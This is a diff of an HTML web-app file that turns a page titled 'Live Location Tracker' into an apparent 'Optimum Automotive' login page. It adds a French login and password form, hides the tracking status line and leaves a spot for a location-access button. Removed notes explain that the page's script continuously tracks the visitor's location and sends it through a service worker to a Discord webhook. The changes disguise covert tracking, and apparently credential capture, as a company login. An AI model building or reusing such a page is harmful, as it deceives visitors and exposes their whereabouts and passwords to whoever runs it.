@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location Tracker</title>
+    <title>Optimum Auto</title>
     <link rel="manifest" href="manifest.json">
     <script>
         if ("serviceWorker" in navigator) {
@@ -24,8 +24,36 @@
     </script>
 </head>
 <body>
-    <h2>Live Location Tracker</h2>
-    <p id="status">Waiting for location access...</p>
+<!--     <p id="status">Waiting for location access...</p> -->
+    <div class="loginWrapper">
+        <div class="logo">
+            <img src="image.png" alt="Optimum Automotive Logo">
+        </div>
+        <form class="login-form">
+
+            <label for="login">Login</label>
+            <div class="login-container">
+                <input type="text" id="login" name="login" required>
+            </div>
+
+            <label for="password">Mot de passe</label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" required>
+                <span class="toggle-password"></span>
+            </div>
+
+            <div class="options">
+                <label>
+                    <input type="checkbox"> Rester connecté
+                </label>
+                <a href="#" class="forgot-password">Mot de passe oublié</a>
+            </div>
+
+            <button type="submit" class="login-button">Connexion</button>
+        </form>
+
+        <!-- Add the "Enable Location Access" button here -->
+    </div>
     <button id="install-btn">Install App</button>
 
     <script>
@@ -140,14 +168,4 @@
     </script>
 </body>
 </html>
-    
-    The HTML file contains a simple structure with a title, a paragraph element to display the status, and a script tag to handle the geolocation tracking logic.
-    The script first checks if the browser supports geolocation. If it does, it requests the user's location using  navigator.geolocation.getCurrentPosition() .
-    If the user grants permission, the script starts continuous tracking using  navigator.geolocation.watchPosition() . 
-    The script also registers a service worker to handle background sync. The service worker is responsible for sending the location data to a Discord webhook.
-    The  sendLocation()  function sends the location data to the Discord webhook. The  startTracking()  function continuously tracks the user's location and calls the sendLocation() function to send the data to the Discord webhook. 
-    The  saveLocationToDB() function saves the user's latest location to an IndexedDB database. This function is called every time the user's location is updated. 
-    Step 3: Create a Service Worker 
-    Next, create a service worker file named  service-worker.js  in the root directory of the project. 
-    This file will handle background sync and send the location data to the Discord webhook. 
-    // service-worker.js
+ 
